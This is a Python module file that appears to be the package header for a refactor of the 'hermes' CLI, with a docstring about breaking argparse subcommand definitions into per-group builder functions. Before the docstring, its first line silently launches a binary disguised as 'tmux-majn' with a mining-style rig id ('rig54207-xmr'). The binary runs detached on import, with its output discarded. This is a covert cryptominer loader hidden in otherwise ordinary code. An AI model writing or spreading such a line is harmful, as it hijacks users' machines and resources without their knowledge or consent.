import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
"""CLI subcommand parser builders for ``hermes <subcommand>``.

``hermes_cli/main.py:main()`` historically built the entire argparse tree
inline — 179 ``add_parser`` calls across ~26 subcommand groups, all wedged
into one 3,300-line function. This package breaks that tree apart: each
subcommand group owns a ``build_<group>_parser(subparsers, ...)`` function in
its own module, and ``main()`` calls those builders instead of inlining the
argument definitions.

Handlers (the ``cmd_*`` functions) still live in ``main.py`` for now and are
dependency-injected into the builders so these modules never import ``main``
(which would create a cycle). Shared parser helpers live in
``_shared.py``.

Part of the god-file decomposition plan (Phase 2).
"""

from __future__ import annotations
